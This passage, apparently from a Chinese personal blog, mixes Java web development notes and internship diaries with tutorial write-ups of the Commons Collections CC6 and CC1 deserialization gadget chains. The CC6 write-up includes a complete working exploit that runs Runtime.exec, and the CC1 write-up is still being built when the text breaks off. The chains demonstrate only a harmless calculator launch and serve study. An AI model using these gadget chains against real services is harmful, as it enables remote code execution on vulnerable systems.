resp.setCharacterEncoding(&quot;UTF-8&quot;); resp.setContentType(&quot;text/html;charset=utf-8&quot;); //得到Session HttpSession session = req.getSession(); //给Session中存东西 session.setAttribute(&quot;name&quot;,new Person(&quot;she11f&quot;,1)); //获取Session的ID String sessionId = session.getId(); //判断Session是不是新创建 if (session.isNew())&#123; resp.getWriter().write(&quot;session创建成功,ID:&quot;+sessionId); &#125;else &#123; resp.getWriter().write(&quot;session以及在服务器中存在了,ID:&quot;+sessionId); &#125; //Session创建的时候做了什么事情；// Cookie cookie = new Cookie(&quot;JSESSIONID&quot;,sessionId);// resp.addCookie(cookie); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 12345678910111213141516public class SessionTest01 extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //得到Session HttpSession session = req.getSession(); Person person = (Person) session.getAttribute(&quot;name&quot;); System.out.println(person.toString()); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 0x07 JSP7.1 什么 JSPJava Server Pages ： Java服务器端页面，也和Servlet一样，用于动态Web技术！ 最大的特点： 写JSP就像在写HTML 区别： HTML只给用户提供静态的数据 JSP 页面中可以嵌入Java 代码，为用户提供动态数据； 7.2 JSP 原理服务器内部工作： Tomcat 中有一个 work 工作目录； IDEA 中使用 Tomcat 的会在 IDEA 中 Tomcat 中生产一个 work 目录 发现页面转变成了 Java 程序 浏览器向服务器发送请求，不管访问什么资源，起始都是在访问 Servlet ！ JSP 最终也会被转换成一个 Java 类！ JSP 本质上就是一个 Servlet 12345678910//初始化 public void _jspInit() &#123; &#125;//销毁 public void _jspDestroy() &#123; &#125;//JSPService public void _jspService(.HttpServletRequest request,HttpServletResponse response) 判断请求 内置一些对象 12345678final javax.servlet.jsp.PageContext pageContext; //页面上下文javax.servlet.http.HttpSession session = null; //sessionfinal javax.servlet.ServletContext application; //applicationContextfinal javax.servlet.ServletConfig config; //configjavax.servlet.jsp.JspWriter out = null; //outfinal java.lang.Object page = this; //page：当前HttpServletRequest request //请求HttpServletResponse response //响应 输出页面前增加的代码 123456789response.setContentType(&quot;text/html&quot;); //设置响应的页面类型pageContext = _jspxFactory.getPageContext(this, request, response, null, true, 8192, true);_jspx_page_context = pageContext;application = pageContext.getServletContext();config = pageContext.getServletConfig();session = pageContext.getSession();out = pageContext.getOut();_jspx_out = out; 以上这些对象可直接在 JSP 中使用 在JSP页面中； 只要是 JAVA代码就会原封不动的输出； 如果是HTML代码，就会被转换为： 1out.write(&quot;&lt;html&gt;\\r &quot;); 这样的格式，输出到前端！ 7.3 JSP 基础语法JSP 表达式 12345&lt;%--JSP表达式作用：用来将程序的输出，输出到客户端&lt;%= 变量或者表达式%&gt;--%&gt;&lt;%= new java.util.Date()%&gt; JSP 脚本片段 12345678&lt;%--jsp脚本片段--%&gt;&lt;% int sum = 0; for (int i = 1; i &lt;=100 ; i++) &#123; sum+=i; &#125; out.println(&quot;&lt;h1&gt;Sum=&quot;+sum+&quot;&lt;/h1&gt;&quot;);%&gt; 脚本片段的再实现 1234567891011121314151617181920212223&lt;% int x = 10; out.println(x);%&gt;&lt;p&gt;这是一个JSP文档&lt;/p&gt;&lt;% int y = 2; out.println(y);%&gt;&lt;hr&gt;&lt;%--在代码嵌入HTML元素--%&gt;&lt;% for (int i = 0; i &lt; 5; i++) &#123;%&gt; &lt;h1&gt;Hello,World &lt;%=i%&gt; &lt;/h1&gt;&lt;% &#125;%&gt; JSP 声明 1234567891011&lt;%! static &#123; System.out.println(&quot;Loading Servlet!&quot;); &#125; private int globalVar = 0; public void kuang()&#123; System.out.println(&quot;进入了方法Kuang！&quot;); &#125;%&gt; JSP 声明： 会被编译到 JSP 生成 Java 的类中！ 其他的，就会被生成 _jspService 方法中！ 1234&lt;%%&gt;&lt;%=%&gt;&lt;%!%&gt;&lt;%--注释--%&gt; JSP 的注释，不会在客户端显示，HTML就会！ 7.4 JSP 指令123456789101112131415161718192021&lt;%@page args.... %&gt;&lt;%@include file=&quot;&quot;%&gt;&lt;%--@include会将两个页面合二为一--%&gt;&lt;%@include file=&quot;common/header.jsp&quot;%&gt;&lt;h1&gt;网页主体&lt;/h1&gt;&lt;%@include file=&quot;common/footer.jsp&quot;%&gt;&lt;hr&gt;&lt;%--jSP标签 jsp:include：拼接页面，本质还是三个 --%&gt;&lt;jsp:include page=&quot;/common/header.jsp&quot;/&gt;&lt;h1&gt;网页主体&lt;/h1&gt;&lt;jsp:include page=&quot;/common/footer.jsp&quot;/&gt; 7.5 九大内置对象 PageContext 存东西 Request 存东西 Response Session 存东西 Application 【ServletContext】 存东西 config 【ServletConfig】 out page exception 1234pageContext.setAttribute(&quot;name1&quot;,&quot;she11f1&quot;); //保存的数据只在一个页面中有效request.setAttribute(&quot;name2&quot;,&quot;she11f2号&quot;); //保存的数据只在一次请求中有效，请求转发会携带这个数据session.setAttribute(&quot;name3&quot;,&quot;she11f3号&quot;); //保存的数据只在一次会话中有效，从打开浏览器到关闭浏览器application.setAttribute(&quot;name4&quot;,&quot;she11f4号&quot;); //保存的数据只在服务器中有效，从打开服务器到关闭服务器 request：客户端向服务器发送请求，产生的数据，用户看完就没用了，比如：新闻，用户看完没用的！ session：客户端向服务器发送请求，产生的数据，用户用完一会还有用，比如：购物车； application：客户端向服务器发送请求，产生的数据，一个用户用完了，其他用户还可能使用，比如：聊天数据； 0x08 JavaBean实体类JavaBean有特定的写法： 必须要有一个无参构造 属性必须私有化 必须有对应的get&#x2F;set方法； 一般用来和数据库的字段做映射 ORM； ORM ：对象关系映射 表—&gt;类 字段–&gt;属性 行记录—-&gt;对象 id name age address 1 sjmp01 3 1 2 sjmp02 3 2 3 sjmp02 3 3 123456789101112class People&#123; private int id; private String name; private int id; private String address;&#125;class A&#123; new People(1,&quot;1号&quot;,3，&quot;西安&quot;); new People(2,&quot;2号&quot;,3，&quot;西安&quot;); new People(3,&quot;3号&quot;,3，&quot;西安&quot;);&#125; 0x09 MVC 三层架构什么是 MVC ： Model View Controller 模型、视图、控制器 9.1 以前 用户直接访问控制层，控制层就可以直接操作数据库； 12345678910servlet--CRUD--&gt;数据库弊端：程序十分臃肿，不利于维护 servlet的代码中：处理请求、响应、视图跳转、处理JDBC、处理业务代码、处理逻辑代码架构：没有什么是加一层解决不了的！程序猿调用|JDBC|Mysql Oracle SqlServer .... 9.2 MVC 三层架构 Model 业务处理：业务逻辑（Service） 数据持久层：CRUD View 展示数据 提供链接发起 Servlet 请求（a,form,img…） Controller （Servlet） 接收用户的请求：（req：请求参数、Session 信息…） 交给业务层处理对应的代码 控制试图的跳转 1登录---&gt;接收用户的登录请求---&gt;处理用户的请求（获取用户登录的参数，username，password）----&gt;交给业务层处理登录业务（判断用户名密码是否正确：事务）---&gt;Dao层查询用户名和密码是否正确--&gt;数据库 0x10 过滤器Filter：过滤器，用来过滤网站的数据； 处理中文乱码 登录验证 12345678910111213141516171819202122public class FilterTest implements Filter &#123; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; servletRequest.setCharacterEncoding(&quot;utf-8&quot;); servletResponse.setCharacterEncoding(&quot;utf-8&quot;); servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;); System.out.println(&quot;CharacterEncodingFilter执行前....&quot;); filterChain.doFilter(servletRequest,servletResponse); //让我们的请求继续走，如果不写，程序到这里就被拦截停止！ System.out.println(&quot;CharacterEncodingFilter执行后....&quot;); &#125; @Override public void destroy() &#123; System.out.println(&quot;Filter 销毁&quot;); &#125; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;Filter 初始化&quot;); &#125;&#125; 12345678&lt;filter&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.she11f.javaweb.FilterTest&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 0x11 监听器编写一个监听器实现监听器的接口… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//统计网站在线人数 ： 统计sessionpublic class OnlineCountListener implements HttpSessionListener &#123; //创建session监听： 看你的一举一动 //一旦创建Session就会触发一次这个事件！ public void sessionCreated(HttpSessionEvent se) &#123; ServletContext ctx = se.getSession().getServletContext(); System.out.println(se.getSession().getId()); Integer onlineCount = (Integer) ctx.getAttribute(&quot;OnlineCount&quot;); if (onlineCount==null)&#123; onlineCount = new Integer(1); &#125;else &#123; int count = onlineCount.intValue(); onlineCount = new Integer(count+1); &#125; ctx.setAttribute(&quot;OnlineCount&quot;,onlineCount); &#125; //销毁session监听 //一旦销毁Session就会触发一次这个事件！ public void sessionDestroyed(HttpSessionEvent se) &#123; ServletContext ctx = se.getSession().getServletContext(); Integer onlineCount = (Integer) ctx.getAttribute(&quot;OnlineCount&quot;); if (onlineCount==null)&#123; onlineCount = new Integer(0); &#125;else &#123; int count = onlineCount.intValue(); onlineCount = new Integer(count-1); &#125; ctx.setAttribute(&quot;OnlineCount&quot;,onlineCount); &#125; /* Session销毁： 1. 手动销毁 getSession().invalidate(); 2. 自动销毁 */&#125; 12345&lt;!--注册监听器--&gt;&lt;listener&gt; &lt;listener-class&gt;com.kuang.listener.OnlineCountListener&lt;/listener-class&gt;&lt;/listener&gt;","tags":["java 开发"],"categories":["开发"]},{"title":"农村信用社代码审计小记","path":"/2024/08/16/work/农村信用社代码设计/","content":"农信代码审计 从赣州银行回来的第二天就又去农村信用社做代码审计了，因为实习生里只有我会 java，所以我就主动请缨了。 第一周是四个人，王哥，飞哥，水哥和我，被三个大佬带真的安全感十足好吧，不过我还是要吐槽一下，农社那边给的是老版代码，还给的不全，我分到的连代码都不完整。jar 包只有一个 jdk 包，调试都调不了，找不到调用。就在那里嗯看代码，后面我摆烂了就准备找点信息泄露就算了。 不过农信那边风景挺好的，他们公司对面就是瑶湖（后面才知道原来这个是艾溪湖），我常常盯着瑶湖发一会儿呆。 第二周水哥就去值守了，我也挖不出什么东西来了，看来我的 java 审计水平还是很一般啊。我想先转 php 代码审计了，先从简单练起吧。当然也不是放弃 java 代码审计学习了，只是说暂时把中心放回 php 这边，毕竟平时 php 代码审计只是打打 ctf，还是想在 php 上实战一番的，然后学习 php 审计的时候一边学习 java 开发知识打好基础吧，毕竟 java 开发的都是大网站，审计门槛挺高的。 2024.8.14今天审的差不多了，明天写一下报告就可以溜溜球回绿盟了。。。","tags":["生活","日常","实习"],"categories":["打工人的三两事"]},{"title":"赣州银行出差小记","path":"/2024/08/14/work/赣州银行出差五日游/","content":"赣银之旅 第一次出差去银行做渗透测试，带我们去的是捷哥，也是我们 15 级的老学长了。 银行整理资产给我测试，第一天就没绷住，网站网站无法访问，app 也打不开，找银行的技术人员解决问题也是相互推来推去，可能都怕担责吧。 然后晚上东哥请客吃海鲜大餐，可是要喝酒，不胜酒力的我很快就头晕上脸了，真得回去好好练一下了（以前的我不屑一顾，现在的我逐帧学习。。。），一回酒店难受的很，看到马桶就想吐，然后就抱着马桶吐了三四回吧，海鲜大餐算是白吃了。 后面就是白天在公司做渗透测试，晚上在酒店给准备举办的第一届校赛出题。总的来说这五天挺充实的，不虚此行吧。 2024.8.1 晚今天周四，靠北了又在赣州呆了四天，上个星期的工作没做完所以回来了，这次虎哥带飞。虎哥和捷哥一样，也是我们 15 级的学长，虎哥请吃了好几顿饭，哈哈哈感觉自己脸皮好厚混了学长们好几顿饭吃。 这次来赣州又从虎哥那里学到了很多东西，太太太不虚此行了！！！明天下午的高铁，希望明天上午我能把个人网银测完。 2024.8.2呜呜呜，还是没测完，赣州下周见 (╯‵□′)╯︵┻━┻ 2024.8.6赣州，我踏马又来辣！这次酒店升级了，可以吃早餐自助了，好耶！！！ 2024.8.6活终于干完了，晚上去逛了一下，最后看几组我拍的照片吧","tags":["生活","日常","实习"],"categories":["打工人的三两事"]},{"title":"CC6 链","path":"/2024/08/04/java/反序列化链/CC 链/CC6/","content":"Java 反序列化第三条链 CC6 JDK 版本：任意 0x01 意义有了 cc1 的两种链，为什么我们还要学习 cc6 呢？因为 cc1 固然好用，但是对 JDK 版本要求，不能大于等于 71 ，而我们今天学的 cc6 就没有版本要求了 为什么 cc1 在 jdk 高版本就不能用了呢，主要原因 是 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了，感兴趣的可以自行去了解。 0x02 分析既然 AnnotationInvocationHandler#readObject 不能用了，我们只能找另一条链子了，而 cc6 的核心就是找到了另一个类看看能不能和 LazyMap.get 连上 TiedMapEntry 可以看到这个类的 getValue 方法调用了 get 函数 123public Object getValue() &#123; return map.get(key);&#125; 然后这个类的 hashcode 方法又调用了 getValue 12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; 那么谁又调用了 hashcode，欸，第一条 URLDNS 链是不是见过这个函数，在 HashMap 类里，CC6 也是找上了这个类，这个类的readObject 调用了 hash 方法 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; 最后调用key.hashCode,key就是我们可控参数，我们只需要让key等于TiedMapEntry即可！因此可以开始编写CC6链雏形了： 1234567891011121314Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry, &quot;bbb&quot;);serialize(map2); 嘻嘻，序列化的时候就弹计算器了，这场景是不是和 URLDNS 如出一辙（序列化的时候就发起了 DNS 解析），其实一样的道理，在第二个 put， map2.put 的时候就会调用 key.hashCode，我们可以先传一个假的参数给任意方法，让这条链子不能正常执行，然后在 put 之后通过反射修改回来就行，这样就能达到序列化不能命令执行，反序列化的时候可以 这里选择在 LazyMap 实例化的时候修改（当然你也可以修改 ChainedTransformer，TiedMapEntry） 1Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); 这样序列化的时候走到 LazyMap 那里就会执行 ConstantTransformer.transform 而不是我们想要的 chainedTransformer.transform ，也就成功打断执行了。 记得 put 完之后再改回来 1234Class clazz = lazyMap.getClass(); Field factoryField = clazz.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); 但是反序列化的时候又不弹计算器了，我们反序列化跟进调试一下，发现还是因为 map2 的 put 也会走一遍链子的原因 12345if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; 走到 Lazy 的 get 的时候，key = &quot;aaa&quot;, map 就是我们的第一个 map ，第一次进来 map 没有这个这个键于是就 put 了一个。 然后我们反序列化再走一遍链子到这里的时候因为是第二次来 map.put(key, value); 成功地让 map 有 “aaa” 这个键了，所以就进不去这个 if 里面了，我们直接在 map2 put 之后把 map 的这个键值对删掉就行了。 完整代码 12345678910111213141516171819202122232425262728293031public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); Class clazz = lazyMap.getClass(); Field factoryField = clazz.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); map.remove(&quot;aaa&quot;);// serialize(map2); unserialize(); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc6.bin&quot;)); oos.writeObject(obj); &#125; public static void unserialize() throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;cc6.bin&quot;)); ois.readObject(); &#125; 0x03 流程图 0x04 思考可以看到整个过程没有再用到 AnnotationInvocationHandler，所以这条链不限制 JDK 版本，而且这条链也不绕，复现起来特别舒服。 白组长弹幕里有一个这个问题挺有意思的 我只要反序列化成功就行，那序列化的时候命令执不执行无所谓是不是就不用管了 评论区有个答案我觉得很有道理 如果你是win的主机，你在构造一条linux的命令执行链，如果你没有进行该操作，你的win没有linux命令，就会导致链子报错，进而导致序列化失败，你就无法生成对应的序列化文件ser.bin。在进行了该操作之后，我们就避免了序列化操作的报错，保证序列化文件的正常生成","tags":["java 安全"],"categories":["java 安全","反序列化"]},{"title":"CC1 链","path":"/2024/08/04/java/反序列化链/CC 链/CC1/","content":"Java 反序列化第二条链 CC1 版本：JDK &lt; 8u71 0x01 意义老规矩，我们先讲为什么要学 cc1 链。CC1 全称 Commons Collections 1，Apache Commons Collections 是一个广泛使用的 Java 库，提供了一组额外的集合（例如：Bag、MultiMap、OrderedMap 等），这些集合扩展了 Java 标准库中的集合类（如 List、Set 和 Map）的功能。此外，它还提供了各种实用工具类和接口来简化集合的操作，看到集合类我们是不是想到了上一条 URLDNS 呢。 Apache Commons Collections 1（CC1）反序列化漏洞的利用链可以用于远程代码执行（RCE），即在目标系统上执行任意代码。这种漏洞利用通常涉及反序列化恶意构造的对象，从而在反序列化过程中触发特定类的方法，导致任意命令的执行。 居然可以任意代码执行，这可太 hacker 了（孩怕😡，所以我们就能总结出为什么要学 CC1 了 Commons Collections 应用范围广，知名框架 Struts 就用了。 漏洞危害大，可以拿 shell 了。 0x02 分析由于是倒着推链子，所以分析起来会很烧脑（个人感觉），所以接下来就以不断抛出问题，再解决问题的方式来分析。 命令执行在哪？从链子最后面的那个类开始分析，我们前面也说了这条链子最后可以命令执行，那我们链子最后肯定要触发命令执行啊。 InvokerTransformer.transform 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 我们注意到这个类里的 transform 方法里实现了反射调用任意函数的功能，这不正是我们要找的任意代码执行的入口吗，OK，接着来看这个类的构造函数，看看怎么实例化这个类并且调它的 transform 方法 InvokerTransformer.InvokerTransformer 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 结合 transform 方法我们发现，第一个参数 methodName 是要调用的方法名，第二个参数 paramTypes 是这个要调用的函数的参数列表的参数类型，第三个参数 args 是要传给这个函数的参数列表。 那我们就可以利用 InvokerTransformer.transform 来实现命令执行了 12InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;);invokerTransformer.transform(Runtime.getRuntime()); 如上述代码，命令成功执行。 但是这个类没有重写 readObject 方法，所以我们还得继续找哪个类调用了 transform 方法。 谁调用了 transform 方法TransformedMap.checkSetValue 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 这么一个方法调用了 transform ，而且 valueTransformer，和 value 我们都可控，这个类的构造方法是受保护的，我们可以找到它的静态方法 decorate 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 这个装饰方法接受三个参数，一个是 Map，一个是 keyTransformer，最后是 valueTransformer，map 是我们要修饰的对象，keyTransformer 用不上到时候传 null 就行了，valueTransformer 则是调用 transform 方法的对象，这个就是我们要控制的地方了 可是就算这样实例化了， checkSetValue 方法也不能直接调用（protected），我们得再找一下哪个类调用了 checkSetValue 方法。 我们看一下 AbstractInputCheckedMapDecorator 类的静态类的 MapEntry 的 setValue 方法 1234public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value);&#125; 如果让 parent &#x3D; TransformedMap，value &#x3D; Runtime 岂不是美哉？ 看到 setValue 是不是就想到了对集合的那几个操作，通过Map.Entry接口，可以遍历和操作 Map 中的键值对。 比如： 123for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) &#123; System.out.println(&quot;Key: &quot; + entry.getKey() + &quot;, Modified Value: &quot; + entry.getValue()); &#125; 那我们就可以试一下是不是真的可以走到 AbstractInputCheckedMapDecorator 类的静态类的 MapEntry 的 setValue 方法里 12345678InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, invokerTransformer);map.put(&quot;key&quot;, &quot;value&quot;);Runtime runtime = Runtime.getRuntime();for(Map.Entry entry : transformMap.entrySet()) &#123; entry.setValue(runtime);&#125; 确实弹计算器了，但是这是为什么呢？为什么 entry.setValue 会走到 AbstractInputCheckedMapDecorator 里面去？我们简单调试分析一下 TransformedMap.decorate 的作用: TransformedMap.decorate 方法通常会创建一个 TransformedMap 实例，这个实例包装了传入的 map，并应用了指定的转换器（在你的例子中是 invokerTransformer）。decorate 方法并不会复制 map 的内容，而是将传入的 map 包装在一个新的 TransformedMap 实例中。 transformMap 的行为: 因为 transformMap 实际上是一个装饰器（decorator），它对 map 进行了装饰。这个装饰器不会复制 map 的数据，而是直接操作原始 map。因此，对 map 进行的任何修改，如 map.put(&quot;key&quot;, &quot;value&quot;)，都会反映在 transformMap 上。 所以我们调试的时候发现 transformMap 的值也是 “key” -&gt; “value”。 正好我们发现 TransformedMap 继承了 AbstractInputCheckedMapDecorator，所以 transformMap.entrySet() 走进了 AbstractInputCheckedMapDecorator 的 **entrySet()**，又因为 AbstractInputCheckedMapDecorator 里的静态类 MapEntry 重写了 setValue 方法，所以最后的 entry.setValue 就会走进来。 MapEntry 是 AbstractMapEntryDecorator 的一个子类，作为装饰器的 MapEntry 提供了一种方式来增强或改变 Map.Entry 的行为。在 TransformedMap 中，MapEntry 主要负责： 调用 checkSetValue() 方法：在 setValue() 方法被调用时，MapEntry 会先调用 checkSetValue() 方法，这个方法用于对值进行检查或转换。checkSetValue() 方法会调用 TransformedMap 中的 valueTransformer 进行值的转换。 **更新底层 Map**：在 checkSetValue() 方法处理完成后，转换后的值会被传递给底层 Map 的 setValue() 方法，从而更新底层 Map。 大部分都是 gpt 的解释，我觉得得再学一下 java 才能看懂这些模块作用。 当然啦还得继续找，因为这个类还没有重写 readObject，那就继续找谁调用了 setValue 谁调用了 setValue 方法AnnotationInvocationHandler 接下来这个类我们可以发现一个非常巧合的事情，以至于一度怀疑是开发者故意留的后门 重写了 readObject 方法 重写的 readObject 里用了 Map.entry 接口遍历 遍历的 entry 里调用了 setValue 方法 完美连上了，简直是神来之笔。 先看一下它的构造方法 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; 第一个参数表示一个 Class 对象，该对象描述了某个具体的注解类型。换句话说，这个 Class 对象可以是任何实现了 Annotation 接口的类的 Class 对象。 第二个参数是一个 Map，键是 String 类型，表示注解成员的名称。值是 Object 类型，表示注解成员对应的值。 实例化 AnnotationInvocationHandler它的构造方法没有任何修饰符，意味着只能在包内访问，所以我们只能通过反射来构造其实例化。 1234Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = constructor.newInstance(Override.class, transformMap); 但是到这里如果想要序列化，我们还得考虑几个问题 如何解决 Runtime 不可序列化你可能会问，我们不是要序列化 AnnotationInvocationHandler 吗，为什么要考虑 Runtime 是否可序列化？ 在 Java 中序列化集合对象（如 Map、List、Set 等）时，集合中的所有元素（包括键和值）都必须是可序列化的。这是因为在序列化过程中，Java 会尝试序列化集合中包含的每一个对象。如果其中有任何对象不可序列化，整个序列化过程就会失败，并抛出 NotSerializableException 异常。 我们肯定是要在 instance 里实现这一段代码的 1entry.setValue(runtime) 我们下断点就能发现，memberValues 作为 instance 的一个属性已经是我们传入的 transformMap ,而且其值正是 1&quot;key&quot; -&gt; &quot;value&quot; 所以说根据，序列化集合对象 集合中的所有元素（包括键和值）都必须是可序列化的 这一条性质，我们就必须让 runtime 也可序列化，毕竟后面设置了 key 的值为 runtime ，然后才执行序列化操作。 Runtime 虽然没有继承 Serializable，但是 Class 继承了，那我们就可以利用反射来实现 exec 方法 12345Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;); Runtime runtime = (Runtime) getRuntimeMethod.invoke(null); Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class); execMethod.invoke(runtime, &quot;calc.exe&quot;); 然后用 invokerTransformer 类 来实现 123Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); 这里可以发现在重复利用 transform 方法，刚好又有这么一个类的 transform 方法可以简写我们这段代码（真尼玛的巧） ChainedTransformer 看一下它的构造函数，接受一个 Transformer 数组 1234public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125; 以及 transform 函数 123456public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; 可以发现是一个递归调用 transform 函数，上一个 i 的 object 作为下一个 i 的 transform 函数的参数 我们整理一下就可得到 1234567Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 不得不感慨一下，真是太优雅了，然后我们再整合进 AnnotationInvocationHandler 里面去 12345678910111213Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer);map.put(&quot;key&quot;, &quot;value&quot;);Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = 